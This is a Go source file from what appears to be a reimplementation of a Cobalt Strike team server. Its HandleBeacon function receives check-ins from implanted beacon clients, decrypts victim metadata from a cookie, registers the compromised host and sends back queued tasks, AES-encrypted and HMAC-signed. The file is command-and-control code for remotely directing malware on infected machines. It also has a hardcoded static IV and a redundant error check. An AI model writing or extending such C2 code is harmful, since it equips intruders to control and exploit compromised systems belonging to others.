package server

import (
	"NewCsTeamServer/client"
	"NewCsTeamServer/crypt"
	"NewCsTeamServer/task"
	"NewCsTeamServer/utils"
	"fmt"
	"log"
	"net/http"
)

// HandleBeacon HTTP服务端处理Beacon请求
func HandleBeacon(w http.ResponseWriter, r *http.Request) {
	// 假设元数据在Cookie中
	cookie, err := r.Cookie("metadata")
	if err != nil {
		http.Error(w, "missing metadata cookie", http.StatusBadRequest)
		return
	}

	// 解密元数据
	metadata, err := crypt.DecryptMetadata(cookie.Value)
	if err != nil {
		http.Error(w, fmt.Sprintf("metadata decryption failed: %v", err), http.StatusBadRequest)
		return
	}
	// 解析元数据
	clientinfo, err := crypt.ParseMetadata(metadata)
	if err != nil {
		http.Error(w, fmt.Sprintf("metadata parsing failed: %v", err), http.StatusBadRequest)
		return
	}

	client.GlobalClientManager.AddClient(clientinfo)
	fmt.Println("Decrypted metadata:", clientinfo)

	fmt.Println("Decrypted metadata.InternalIP:", utils.Uint32ToIPString(clientinfo.InternalIP))

	if err != nil {
		http.Error(w, fmt.Sprintf("read body failed: %v", err), http.StatusBadRequest)
		return
	}

	// 提取签名和数据
	iv := []byte("abcdefghijklmnop")

	// 检查任务队列并下发任务
	taskdata, exists := clientinfo.TaskQueue.PopTask()
	if !exists {
		fmt.Println("No tasks available for client", clientinfo.ClientID)
		w.WriteHeader(200)
		w.Write([]byte(""))
		return
	}
	// 加密任务数据
	taskPacket, err := task.BuildTaskPacket([]task.Task{taskdata})
	if err != nil {
		http.Error(w, fmt.Sprintf("task encryption failed: %v", err), http.StatusInternalServerError)
		return
	}

	// 加密任务数据
	encryptedTask, err := crypt.AesEncrypt(taskPacket, clientinfo.AESKey, iv)
	if err != nil {
		http.Error(w, fmt.Sprintf("task encryption failed: %v", err), http.StatusInternalServerError)
		return
	}

	// 添加HMAC签名
	signature := crypt.AddHMAC(encryptedTask, clientinfo.HMACKey)
	responseData := append(encryptedTask, signature...)

	// 返回加密的任务数据
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(responseData)
	log.Printf("Task sent to client %d: ID=%s, Type=%d, Content=%s", clientinfo.ClientID, taskdata.ID, taskdata.Type, taskdata.Content)
}
